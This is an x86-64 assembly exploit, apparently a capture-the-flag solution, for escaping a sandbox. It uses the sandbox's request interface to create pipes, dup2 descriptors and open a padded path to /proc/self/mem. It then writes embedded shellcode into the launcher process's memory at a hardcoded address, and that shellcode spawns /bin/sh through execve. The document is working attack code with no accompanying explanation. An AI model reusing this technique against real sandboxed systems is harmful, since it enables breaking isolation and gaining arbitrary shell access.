%define PATH '/proc/self/mem', 0x00
%define PATH_LEN 100
%define RETVAL 0x603138
%define BUF_SIZE 0x100
%define SANDBOX_ARG 0x603158
%define SANDBOX_TO_LAUNCHER 0x603134
%define PIPE 0x603858
%define FD 10

global _start
_start:
  jmp string

send_to_sandbox:
  sub rsp, 0x100
  mov qword rax, 1
  mov qword rdi, [0x603148] ; request_fd
  mov qword rsi, rsp
  mov qword rdx, 1 ; one byte
  syscall ; run
  add rsp, 0x100
  ret

send_to_launcher:
  sub rsp, 0x100
  mov qword rax, 1
  mov qword rdi, [PIPE + 4] ; request_fd
  mov qword rsi, rsp
  mov qword rdx, 1 ; one byte
  syscall ; run
  add rsp, 0x100
  ret

recv_from_sandbox:
  sub rsp, 0x100
  mov qword rax, 0
  mov qword rdi, FD
  mov qword rsi, rsp
  mov qword rdx, 1 ; one byte
  syscall ; run
  add rsp, 0x100
  ret 

recv_from_launcher:
  sub rsp, 0x100
  mov qword rax, 0
  mov qword rdi, [0x603130] ; response_fd
  mov qword rsi, rsp
  mov qword rdx, 1
  syscall ; wait until finished
  add rsp, 0x100
  ret

send_request:
  call send_to_sandbox
  call recv_from_launcher
  ret

get_shellcode_addr:
  call shellcode
  shellcode:
  pop rax
  add rax, 4
  ret
  inc rbx
  inc rbx
  inc rbx
  inc rbx

  mov rsp, [SANDBOX_ARG]
  add rsp, 0x800
  mov rax, 59
  mov qword rdi, 0x0068732f6e69622f ; /bin/sh
  push rdi
  mov rdi, rsp
  mov rsi, 0
  mov rdx, 0
  syscall

start:
  pop r8; save string name
  sub rsp, 0x2000 ; need stack

  ; create pipe
  mov rax, [SANDBOX_ARG] ; sandbox_arg
  mov qword [rax], 22
  mov qword [rax + 8], PIPE
  call send_request

  ; dup2(x, FD)
  mov rax, [SANDBOX_ARG]
  mov qword [rax], 33
  mov qword rdi, [SANDBOX_TO_LAUNCHER]
  mov qword [rax + 8], rdi 
  mov qword rdi, FD 
  mov qword [rax + 16], rdi
  call send_request

  ; dup2(rpipe, x)
  mov rax, [SANDBOX_ARG]
  mov qword [rax], 33
  mov rdi, [PIPE]
  mov qword [rax + 8], rdi
  mov rdi, [SANDBOX_TO_LAUNCHER]
  mov qword [rax + 16], rdi
  call send_request

  ; copy '/' * 4040
  mov qword rcx, 0
  mov rax, [SANDBOX_ARG]
  lea rax, [rax + 24]
copy_slash:
  mov byte [rax + rcx], 0x2f
  inc rcx
  cmp rcx, 4040
  jl copy_slash
  mov byte [rax + rcx], 0

; call open
  mov qword rax, [SANDBOX_ARG]
  mov qword [rax], 2
  lea rdi, [rax + 24]
  mov [rax + 8], rdi
  mov qword [rax + 16], 1 ; 
  call send_to_sandbox
  call recv_from_sandbox

  ; copy path
  mov qword rcx, 0
  mov rax, [SANDBOX_ARG]
copy_path:
  mov byte bl, [r8 + rcx]
  mov byte [rax + rcx], bl
  inc rcx
  cmp rcx, PATH_LEN
  jl copy_path

  call send_to_launcher
  call recv_from_launcher

  mov qword rdi, [RETVAL] 
  call get_shellcode_addr 
  mov rsi, rax ; save shellcode addr

  mov qword rax, [SANDBOX_ARG]
  mov qword [rax], 18
  mov qword [rax + 8], rdi
  mov qword [rax + 16], rsi
  mov qword [rax + 24], BUF_SIZE
  mov qword [rax + 32], 0x401657
  call send_to_sandbox
  call recv_from_sandbox
  call send_to_launcher
  call recv_from_launcher
  
string:
  call start
  db  PATH
  
